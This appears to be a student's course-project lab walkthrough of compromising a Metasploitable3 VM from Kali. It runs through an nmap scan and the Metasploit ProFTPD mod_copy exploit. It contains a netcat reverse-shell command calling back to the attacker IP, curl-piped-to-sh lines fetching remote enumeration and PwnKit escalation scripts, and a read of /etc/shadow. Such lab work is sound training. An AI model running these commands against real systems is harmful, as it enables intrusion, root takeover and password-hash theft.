# 📚 Phase 1: Setup and Compromise the Service

---

## 🛠️ 1. Environment Setup

### 1.1 Import Victim VM (Metasploitable3)

- Downloaded `.ova` file from [SourceForge](https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/)
- Open VirtualBox → File → Import Appliance
- Customized settings (RAM=2048MB, CPU=2)

**Screenshots:**
- ![1-virtualbox_attacker_machine.png](./screenshots/1-virtualbox_attacker_machine.png)
- ![2-import_appliance_option.png](./screenshots/2-import_appliance_option.png)
- ![3-select_metasploitable3_ova.png](./screenshots/3-select_metasploitable3_ova.png)
- ![4-import_appliance_settings.png](./screenshots/4-import_appliance_settings.png)
- ![5-import_progress.png](./screenshots/5-import_progress.png)

---

### 1.2 Boot the Victim VM

- Started VM with credentials:
  - `username: vagrant`
  - `password: vagrant`

**Screenshot:**
- ![6-metasploitable3_login_success.png](./screenshots/6-metasploitable3_login_success.png)

---

### 1.3 Obtain Victim IP Address

- Victim (Metasploitable3) IP: `10.0.2.15`

**Screenshots:**
- ![7-ifconfig_command.png](./screenshots/7-ifconfig_command.png)
- ![8-victim_ip_found.png](./screenshots/8-victim_ip_found.png)

---

### 1.4 Obtain Attacker IP Address & Confirm Network Connectivity

- Attacker (Kali) IP: `10.0.2.6`
- Pinged victim from attacker:
```bash
ping 10.0.2.15
```

**Screenshot:**
- ![9-kali_ping_success.png](./screenshots/9-kali_ping_success.png)

---

# 💣 2. TASK 1.1: Compromise Service Using Metasploit

---

## 2.1 Scan Victim with Nmap (Terminal A)

```bash
nmap -sV 10.0.2.15
```
- Discovered ProFTPD 1.3.5 on port 21

**Screenshot:**
- ![10-nmap_scan_results.png](./screenshots/10-nmap-scan-results.png)

---

## 2.2 Launch Metasploit Console (Terminal B)

```bash
msfconsole
```

**Screenshot:**
- ![11-start_msfconsole.png](./screenshots/11-launch-msfconsole.png)

---

## 2.3 Search and Use Exploit (Terminal B)

```bash
search mod_copy
use 0
```

**Screenshot:**
- ![12-search_modcopy_exploit.png](./screenshots/12-search-mod_copy-exploit.png)
- ![13-select-mod_copy-exploit.png](./screenshots/113-select-mod_copy-exploit.png)

---

## 2.4 Show Exploit Options (Terminal B)

```bash
show options
```

**Screenshot:**
- ![14-show-exploit-options.png](./screenshots/14-show-exploit-options.png)

---

## 2.5 Configure Exploit Options (Terminal B)

```bash
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
```

**Screenshot:**
- ![15-set-RHOST-to-victim-ip.png](./screenshots/15-set-RHOST-to-victim-ip.png)
- ![16-set-SITEPATH-to-var-www-html.png](./screenshots/16-set-SITEPATH-to-var-www-html.png)

---

## 2.6 Configure Payload and Reverse Shell Command (Terminal B)

```bash
show payloads
set payload 5
show payload options
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
```

**Screenshot:**
- ![17-show-compatible-payloads.png](./screenshots/17-show-compatible-payloads.png)
- ![18-set-generic-reverse-shell-payload.png](./screenshots/18-set-generic-reverse-shell-payload.png)
- ![19-verify-payload-options.png](./screenshots/19-verify-payload-options.png)
- ![20-set-CMD-netcat-reverse-shell.png](./screenshots/20-set-CMD-netcat-reverse-shell.png)

---

## 2.7 Configure Exploit to Retain Payload on Target (Terminal B)

```bash
set AllowNoCleanup true
```

**Screenshot:**
- ![21-set-AllowNoCleanup-true.png](./screenshots/21-set-AllowNoCleanup-true.png)

---

## 2.8 Start Netcat Listener (Terminal A)

```bash
nc -lnvp 4444
```

**Screenshot:**
- ![22-start-netcat-listener.png](./screenshots/22-start-netcat-listener.png)

---

## 2.9 Run Exploit (Terminal B)

```bash
run
```

**Screenshot:**
- ![23-run-exploit.png](./screenshots/23-run-exploit.png)

---

## 2.10 Confirm Reverse Shell Access (Terminal A)

```bash
whoami
ls
```

**Screenshot:**
- ![24-successful-reverse-shell-access.png](./screenshots/24-successful-reverse-shell-access.png)

---

# 🛠️ 3. TASK 1.2: Custom Scripts & Privilege Escalation

---

## 3.1 Run Custom Enumeration Script (lightpeas.sh) (Terminal A)

```bash
curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/lightpeas.sh | sh
```

**Screenshot:**
- ![25-run-lightpeas-script.png](./screenshots/25-run-lightpeas-script.png)
- ![26-lightpeas-enumeration-results.png](./screenshots/26-lightpeas-enumeration-results.png)

---

## 3.2 Execute Custom Privilege Escalation (escalate.sh) (Terminal A)

```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
```

**Screenshot:**
- ![27-run-escalate-script-and-root-access.png](./screenshots/27-run-escalate-script-and-root-access.png)

---

## 3.3 Confirm Root Access

```bash
whoami
cat /etc/shadow
```

**Screenshot:**
- ![27-run-escalate-script-and-root-access.png](./screenshots/27-run-escalate-script-and-root-access.png)

---

# 📆 Custom Scripts Used

| Script | Purpose |
|:------|:--------|
| `lightpeas.sh` | Local enumeration script (gather system info) |
| `ExploitRoot.c` | Custom compiled PwnKit-based root exploit |
| `escalate.sh` | Automated script to compile and run ExploitRoot.c |

✅ Located at: `phase1/custom/`

---
